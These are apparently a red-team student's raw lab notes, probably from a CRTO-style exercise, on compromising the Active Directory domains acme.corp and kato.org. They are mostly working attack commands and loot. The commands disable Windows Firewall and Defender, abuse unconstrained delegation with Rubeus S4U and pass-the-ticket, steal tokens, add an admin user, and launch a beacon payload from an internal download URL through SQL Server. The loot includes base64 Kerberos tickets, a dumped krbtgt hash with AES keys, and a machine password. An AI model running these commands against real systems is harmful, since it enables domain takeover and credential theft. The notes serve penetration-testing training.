domains 
- qrictgydszhlhw.info
- nbqtddutqn.org
- znkfchsslimnfp.info
- bforgbdaurgjettxago.com

got shell after doing all the prep

run beacon from c"\windows\tasks

exe would on

![[Pasted image 20240426084508.png]]
 looks to be possible service

![[Pasted image 20240426115051.png]]
acne.corp 

![[Pasted image 20240426115211.png]]


pivoted through host on pivot listener

cotton is a sysadmin on domain

can access web.acme.corp
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

powerpick Set-MPPreference -DisableRealTimeMonitoring $true -Verbose; Set-MPPreference -DisableIOAVProtection $true -Verbose; Set-MPPreference -DisableIntrusionPreventionSystem $true -Verbose

remove all defnitions "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1

unconstrained delegation

    doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAm98hEqCfMclfVFC3EgTTlwtFh4yzACveD/j5Rp2hhgXRLb1fwlcttB6czqFZe6JqfX/P5mNk0Wl5vEcEACceBYwcsghOtvqn8CpQR8NPRMeTQZPpXKCtfBWStoa+J7WZgoCWipZwVINPs1KKlsbdEszdNRAtpImo9pOOAiZTJTL7kFdvXuQLt0KWFejDVCXu9zSRSmPrwP6OTPgPV8NExI5C0Gch+HFFETsHzVg2d4+WS0IBd2PLciXd/TnMdgYnhkPNEPolursZ7n4/5DaJp6j3Ll7oNpLp2vWjePZwaSK1MuqGpGoj4O1Nu21J7dqWBcph9MQb0ThTUCqAKWrxNgAU+XYL5WpB7+vX8lZ2sCT4E7tGy9JJKnxRK/DvF/mbKrz9aX0mR2AXEmS54CHlItRrldm+sVA/1FJGK50jg6lulHUylXbQcf9cRFcNRH7tvW9wmLhyPdFQfwjiJfBlEwshCOToSh1C8UUSVP1/QvvFWdkJnANI8MJ6p3XsKbTLExci9pBX+sysjO0oIapNTAi6rvV2x5mr/3Bauv3rMHKQe5InEcLjwHEZKqebaxF+pnFW0mohPVtQWmgFTn4KJONXeDHvq3fm+W5FmR+E2RUvv7FMkaBld2CVZXyAypE/jsdYWGI4cug+OgexBw3tooR7X5zEUmw/gPSa5qf/hATlxov9gVhsB45fJFgW+r/T8fmtMfBQGQ7EfKTUu2M9aAaSwF3RnIImkOcxZzL4Z8uCOdJkZoJ6s7vWYlFNf8g9NZonURc8UxoBCMpKgU61zuiVZrporR2tj5d8emOJsfzXLELu1EqyQTGc5/niTiUXsam/BN//1Ok7Ihm32kf7rvRWz/qqYIwyt/a0D+c1OxquxLNVd+KXbq8bWLyCJ5QprQTPZ83O5cNdHmRgZdgU27nY4qkfBdBbGYnzyoCPfQs7YZY+UlUFGbVO4K8u6y9vFH45IOI9BkdI53yW/Qd13QJ1TQw6YVYritNE1Ba5kk5Zf7Kj88GvyyFNcS+EMRga+ImZY7XHMFYHgyfYDgBSbQGZLdUs3Cz3gRRtsw99X6IYyYgUnbzgjx6uN4nRvGa1FMp1AqJJKwpw135rfsrvTbkfoXGWXgPe/kvGI9ey/GJHxVy9Zy5jQ49R5EFv8fPBJb5zM57UsCi+PeZXExj3mUDVNzhNAcg5cF4D42JVEYYLGGJTF8RMGM8j0/AySJVLM6ZQsfS+RgJZPKAchRdPaDIi2P5ryxwJRtvPMmPI8/FRD4ZqwIITR+w8Xdc50nehpWztj6V13D8YA/9W+EJ88BtheJXfqeo/gKow7R4oAoG6tXXGoGK+pqigpbzMacKb9lm3dZMI7WMhnX5ylJDi9gkAVoCSjingEoo4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgkQgvGrJn75a6gM6ZVxSuxxxW0mxSfAtGk5S2lFOh+LuhCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjQwNDI2MTIwNzI1WqYRGA8yMDI0MDQyNjIyMDcyNVqnERgPMjAyNDA1MDMxMjA3MjVaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ

admin ticket
      doIFvDCCBbigAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQsbCUFDTUUuQ09SUKIfMB2gAwIBAaEWMBQbBGNpZnMbDGRjLmFjbWUuY29ycKOCBIEwggR9oAMCARKhAwIBAaKCBG8EggRrc9Qmb+PiUNso7peq2uzMBoTy/oJCVtnJsHjinWgzGyEBvtLq+MMkAnjUqSYLdFsamNz88EZ2h5zKHaaidHtEuTRvKDmeZBZgRd58iMAmwXTrZhBe1xUPTDS5aEIZsoSJK/ih5FvgDYR/xkZwqr2KjickYJlW8w1z13RXJshKEgeosa+IJ9fmsmqrAijyhIFLH/jrveQl9BKh68MKFbEoyuADYSHoUF3Jpuk0zOmNVW4zTkS9H31xStyBJMa2GWoRtkqQDWPIkKG1U5e/iyPEiHXZKi4DBrR4JiMLabO9OlPDE319edzCqMMfWaA7EFiZ0YTNuLUaRMdsoK0IDjmWt9raD+V/CbmjtFj/1EjDo5S4ysB4o/6UBa4y2/aqe3RFthjsh19ER8V4/XxogoHIvkvqKC6dL+GSDnOyGDA5uFNSlNpz/CalFcNhxANOpaUEEse+Cavaa8lrXfGxq/ofP0Xv8PGOOPVOS3IBj1ldsOL816GWnxaQR751b0dwYehMB3DESujjiRYJdK6daolGHmU15TAsjXDosTiLOI+7gPITpd3UsCcRftRe1aNkn3haSHQGbSSDwpi34q3zMhqM3B7SwsJPrrpxz2k8O7gCZYJpP7M5eSiK0KthdCIL4lbVBQ0WLU5Cp6q9VgRRL/AmoDfV8mkmD1718AvohLVmjyFrk7T+p4pkamXS6j44MLliGi3Am4TzsoRS0A6dG6T6RodH6/HI+b4pMPVC2SN8NIqIEw6yOEJdthV48Fw/lu+dwyzo8oqvtg5e/rJM2Gb/QchDxuptx3Cr6k5k4ZNP9++uhoh8e8SSlIpiDRGkNwel/ZDvFl2yJJFBJfsMo0cQHwZKti/VjxPvoykyZZROlqod0AlC+TxbZ0eJehtmRMatLWTUVb97zTgqg3IbZ787qBjw6lUA+d/1QybhGlJBQ3SXd5WrMNcL1INavIzYH9SQddCrliI96oEzdD0P713kCgUGcLwfPuCjIv+FoeWb1NdkeIVcLoK9cz7E518CUCCdAaMizr3VU7w49GOQKjgm8Jj6rH0b1ECHmNq8bffyoTjC9Tl1g8Bb3j+EeZGI9VFN1ydk1KfrzZcOt5/HGjERGgdAfm6hbcunYahoqmlhMhEwTz9dAbnHIERDNPvVvoXCPuuvzDJfBuh8N0M6xSPKH7Ya2ukxWzR7zi6SxgxskZVrvjla1GjNvZX8N+6M6iAdgKhrG+u+x2zvKxxQ25GwQdmeb8zYyqXlKQmzr99sOSdRRFYNEcrsSrFABl7mraqrQDyBzxvqwPnamjfkqYJXSn3UMjQrp1YlNyrIaQcVrBYqAi+E50dEwm9d2Oa3210u5vQibPIBtECjetqBt7zMN/28KDqQrAecA4QsiMjMc+vOu36G3/ozmmtXwzs+0UOvi2/EJwndqoOFWg9hxA8fq2KjN28qyOT/e5d66k4hIMeZwT7/hog70xjAxrr1GOiP6WjkyTcA3XhoTy2Ei1CoI2ewE0v/pUhmyA9do4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgAX4gXJAncOJpDcy1zLSoK7iliteENTekjV7iAW3cELehCxsJQUNNRS5DT1JQohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAYKUAAKURGA8yMDI0MDQyNjE5NTgwMFqmERgPMjAyNDA0MjYyMjM3NDdapxEYDzIwMjQwNTAzMTIzNzQ3WqgLGwlBQ01FLkNPUlCpHzAdoAMCAQGhFjAUGwRjaWZzGwxkYy5hY21lLmNvcnA=


execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:dc$ /impersonateuser:Administrator /altservice:cifs/dc.acme.corp /self /nowrap /ptt /ticket:


# Inject the TGT into a sacrificial Process and then try to access the machine share. You will get the error.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:<TGT-TICKET>

beacon> steal_token 7656
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# Now Perform the S4U2Self Abuse to get the TGS from the injected TGT in the sacrificial process and use rubeus /ptt to directly pass the ticket to the sacrificial process. (Run it within Sacrificial Process)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:dc-2$ /impersonateuser:Administrator /altservice:cifs/dc-2.dev.cyberbotic.io /self /nowrap /ptt /ticket:<TGT-TICKET>
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$

### ruben password123!
net user username password /add
net localgroup Administrators hacker /add


dnshostname
ad.kato.org
jmp.kato.org
db.kato.org

http://10.10.120.20:8080/download/jmp_443.exe



sql stuff

krbtgt

      doIFIDCCBRygAwIBBaEDAgEWooIENjCCBDJhggQuMIIEKqADAgEFoQobCEtBVE8uT1JHoh0wG6ADAgECoRQwEhsGa3JidGd0GwhLQVRPLk9SR6OCA/YwggPyoAMCARKhAwIBAqKCA+QEggPg7GCMGhimqTikAbk4juvMkZdnLTUrKWJt13zQPNBocjkI2qfIs2Geg48E13s8qRSxDYPnIunF+4aFdasnKANEDqlE16n50gU0C/tb5yi6OItWVpXPdDniXFfAkI8TjFUW/3QTQ7UhLG79Hfoa9xekObAdr8Tyq0fB9RBxNUJOPJxCppEo4LLYRa6Sq5qjm4WSUBDoTDRudQrNaF43gs3KAExiZGl1oUAOsO4XTxyb4lAWN7A7Ma3UzC+QCppO2cOL22TuxFNGmumUHy8Szf47sfkt3jTLKt/y+kniFz8pLu7iXHMxoAcfzAnSn/TpbAzy9TSiFpn8gHkyd91Ovwxt94xiyzAz/L53l+z2zLhRsAatcsXokXwFqidnyHTvMAz3gJhxUQgoGJMqRsKCFOfDS6XBLvbnyCOYCBJzrLA6wtTlYXoSrMfTl9Gjcvqxy+5faFpqARCIJyJae0OLdD5RtznZzN4rLv8xEuMzWDiVRu8Ox2rMEDJBBfqp0t5RjUDMjlYVm3063pq5fn+5+97sqfS3C64z8pjm0axYYTArNsCSmIgr+kTcZ5h1dthAS5ZUNAJBcZqcnEjhOt6AHdOSe8s4k2kJqarqHCUIQPGqVh5uINUkTy2qCcl6Bm5IOTcqWYrVo16HAFKNUtZmECOiYMyAEO44marOB9xuqmmI/cEPkOr94qHlf25nnm+9exDCnjTzaCMlKzrszVlVYAURM0u4gE7ak8f3go6ukhNazdsNJ2SVy7+CNPoOAmKxqRJIu+6cRnIVW2SfkRskYrKSVjv/7s9NwIli6Ycvqs+p8JBg0QFZdaN/8/zWraEppgvZLXmRdNKfNiXUzOBPJpt0i4MEJp1oioE9ehOJKhfM/74bSTDIdep4Rca+kCGylW/S4nEqiwdhw2Mf2cSYhde6/ARcNPRUJEOP1LeUcgKtwnEdUK2sO45sgCffiS+8OYnCX8L3xaAtDilHevUcezDQo0wfy0ZX2EejnOcw/9piy8Ic8gVwnBVZAtq4X5kGom7TWRtNbpWvw7OpdBq3eCqit8UJgv9xb7ML2ZH3l0H1cyAHFmUNtgqdLeOjPO2EGW5HNdwUG59zInny5vWnRBk+21jFvO19Aqg0PzdTwImOmy5TmjjThaqE18F5M7xZwVEqI33+LfveRhbSXe6QaLwGzbnkuhzld7FSGU7ZM/Z62+TjYdkjJkr8vyeRyyfKlmdFv/vlPCWzwPkOXfGnsXIAFgqGoYtu88LgdH7RNUCeiCFQfjukEuVjIVc43muE8oye5sRESbMHDcO98Mp3x7VvWziNlchDBq70JVoXwYr9wn+jgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKArMCmgAwIBEqEiBCDZtmOipqEiqQp0Vx1t2l6Yj54aezTjyV32Wqq7tVgGrqEKGwhLQVRPLk9SR6IQMA6gAwIBAaEHMAUbA0RCJKMHAwUAQOEAAKURGA8yMDI0MDQyNjIxNTI1OFqmERgPMjAyNDA0MjcwNzUyNThapxEYDzIwMjQwNTAzMTIwNzU3WqgKGwhLQVRPLk9SR6kdMBugAwIBAqEUMBIbBmtyYnRndBsIS0FUTy5PUkc=



[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null;
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator'); $idToImpersonate.Impersonate(); $idToImpersonate.Impersonate();[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

GPODisplayName GroupName
Jump Users
KATO \Foreign Kato Users


powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1


      doIFIDCCBRygAwIBBaEDAgEWooIENjCCBDJhggQuMIIEKqADAgEFoQobCEtBVE8uT1JHoh0wG6ADAgECoRQwEhsGa3JidGd0GwhLQVRPLk9SR6OCA/YwggPyoAMCARKhAwIBAqKCA+QEggPguWR+pcnITeAA1ua6ykGg003da6LjtDqTOGsp+nx0ulFpiPbQ4zfoooPeJHf9+Fc+fteWtj6CHDcUoC4Bhkb3gfR7Tr3D92SInGNb66pOl7ifNeMfH4RLwTWriCdadZ+5Za0A9AE/KXWumP3GLutVwbpWZDXc5pUZowFAZ8L50qymPBOMemITyK9oEuOMjc5o5hFI1L4AeOjcONFhhySW3g70VlsDSjyfPjCjOhJpk8ZHRGhGngMdm3ftsoOKPNSMomlfSHTdjmwXCsMu4BhcFF+6tOmYtcJP60C0igzuxby5DCu4GMMIEXYcaucMB/IJh9gNuQ8MvbkVgyiNfLwdhdGNw4/PiI8SyI3LACkVJBzsv/M/QFyllzS1gN/v++y719TODiLZWUnIoKySF4urA5Bi1BmwIw+ptxkikXZgT9ua7T2TKSjnKidX1Ha83DYuvfm82Gb9PAc77kldpRtyZKF0Ek8TV+40vdayl025dRbI2qsiQZPSNDZRLkVb0qGYujIXGEM7al90hfI7kENi8ovjuptbouQxuHcQT/KzLhDxdR2W729uWnEjG4Z1cFPYOOBrh7swnClmCJCH8EwL9WhjFlfm3FXr89AYlb+f5yd8HzOjt+utvMDyNYMW5g6ryMMJAFDIijDQ9+4kjCwcVDO47q9rtSkWPAxlGL7IOTBvdFE+2+8erC6nntHunItam7LrSITdP5UfKJYzslkbjkfL4wHPJ57CS9i2XCMsvLdofcM+GTYY8qWR2JzrqxNIJ3jCsharVZq7MXwg2aoKuJFgJOxBW+IKdW5KTCdznwSIsQVWHSqqUYs+SfDA7fgLpV3/41plJG9Et717l3H8E6UNyPjQs00lN7220LWHgNCpaUnY1z8KAdQ0nY9qAWRoJjWVRkW1ndQVwo7iC1kBEldcpBwL3jxA/9FwTm1VTlmRXMHvHRY6TSODO6DEXee45ID8kpF+404JwyEjvE+eSM3VBHvvT9toiJvfLnPIA4EKiI2MMn+Inf8bvl4SdQe6Q/kD/Ch8ZfwNFJHirE3wfFexMDdON98S/W30n0DrkUq5RFGFAt2LnK/gEEvSr9YEDoLuOX2DBmK1EP/57X1dNGFiyIbiuyRilTPnhmN4qcbj9G9Au4q0DCW8LOBcxEotV9u6DaO7C+EBaHxZlVm4U8wttB6lZbwyM1E/SWykckM+z8TjYykyjxX44/j99FahYOET71GoPX/TrTd3fBuYBbLu51ngeyEMRZibUpP16ZQQOeW2RwLBp13uuvGwBXc0MRGzDMn4I6MnXRPzOEDtygVJmgV1jA0NJj+SF8/2OVSjgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKArMCmgAwIBEqEiBCAuBVLQ4tvOgxknha+q3E7+9sw17wv91LaJEd7nRnG+9aEKGwhLQVRPLk9SR6IQMA6gAwIBAaEHMAUbA0RCJKMHAwUAQOEAAKURGA8yMDI0MDQyNjIxMzc0MlqmERgPMjAyNDA0MjcwNzM3NDJapxEYDzIwMjQwNTAzMTIwNzQxWqgKGwhLQVRPLk9SR6kdMBugAwIBAqEUMBIbBmtyYnRndBsIS0FUTy5PUkc=



# nitial Enumeration (On Each intermediate Machine)

[](https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO%20Checklist/Initial%20Enumeration%20(On%20Each%20intermediate%20Machine).md#initial-enumeration-on-each-intermediate-machine)


- [ ]  Dump Credentials using Mimikatz.
- [ ]  Dump kerberos tickets. And check for TGTs. (Rubeus.exe dump)
- [ ]  Check if any SQL-Server links that are compromised lies in some other forest, then use that to further escalate to the Target Domain.
- [ ]  Enumerate stored Credentials (DPAPI) as both Domain User and Local Admin. Dump stored credentials from Vault (DPAPI) - Web Credentials , Windows Credentials.
- [ ]  Check if any process running as other user , steal its token and Check for access on other machines using its token (Find-LocalAdminAccess).
- [ ]  Check for Local Admin Access on various machines from current user.
- [ ]  Check for Domain Admins access on various machines
- [ ]  Check for DC Replication rights to perform DCSync Attack.
- [ ]  Check for Unconstrained Delegation (If a Machine has unconstrained delegation then ESC8 can be used to get access to that machine and later on abuse Unconstrained delegation)
- [ ]  Check for constrained Delegation
- [ ]  Check for RBCD
- [ ]  Have WriteProperty, GenericAll, GenericWrite or WriteDacl on a computer/User Object
    - [ ]  Check if RBCD can be configured and abused
    - [ ]  Check for GenericAll, GenericWrite on user or computer objects and modify/add msDS-KeyCredentialLink attribute to abuse Shadow Credentials.
    - [ ]  Check if we are able to reset the User Password
    - [ ]  Check if we can Set-SPN or Disable Kerberos Pre-Auth to Perform Targetted Kerberoasting and Roast the Account.
- [ ]  To get Local Admin access or Local Priv Escalation, Use KrbRelay with RBCD or with Shadow Credentials.
- [ ]  Check Certificate Authority (CA’s) and if present look for Misconfigured/Vulnerable Templates (ESC1) - ENROLLEE_SUPPLIES_SUBJECT , If you found ESC1 , then you can compromise the Domain Admins or Any Domain Users.
- [ ]  Check if NTLM Relaying to ADCS HTTP Endpoints (ESC8) ****is possible to abuse.
- [ ]  Check for Vulnerable GPO , and find the associated OU and the Computers/Users, Then Modify the GPO to get beacon.
- [ ]  Check if you can a new GPO and Configure it , and then link it to any OU where the interesting Users/Computers may be present to get beacon on them.
- [ ]  Check if any SQL Servers have any interesting databases , where credentials or anything interesting may be stored.
- [ ]  Check if any accessible shares have any interesting files.
- [ ]  Check if LAPS is being used and try to abuse it.

powerpick Invoke-SQLOSCmd -Instance "db.kato.org,1433" -Command "C:\Windows\Tasks\run.exe" -RawResults


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




41dfe5317cd566cc3e68e33d9e8798790b2181cca14a00c1dcd64aa1e8738ddb

AM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 10/6/2022 11:58:44 AM
Object Security ID   : S-1-5-21-2708793558-3453453652-160833008-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 050f62c9bb535345f14defa592ce499e
    ntlm- 0: 050f62c9bb535345f14defa592ce499e
    lm  - 0: 4cada81a21087460704b022249917800

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f2a95e4189642cf31dadc31d7e6a1df0

* Primary:Kerberos-Newer-Keys *
    Default Salt : KATO.ORGkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 41dfe5317cd566cc3e68e33d9e8798790b2181cca14a00c1dcd64aa1e8738ddb
      aes128_hmac       (4096) : 7e10ed4fa5f6f0c4935277c0bb0ce2a9
      des_cbc_md5       (4096) : c2d33ee90ed96d0b



kato.org\db$ H@fWIk<B]U(:E->:]aBJK':CMcT-FVoWu/!oZ^q14fIM_foA*TRNP:]U'7W@BcGfZyX;.ZeippR>b_S=X#icO5&^yhRT%J$g08Hz'8`*:'$P;Hf3nMj)FhZi


S-1-5-21-2708793558-3453453652-160833008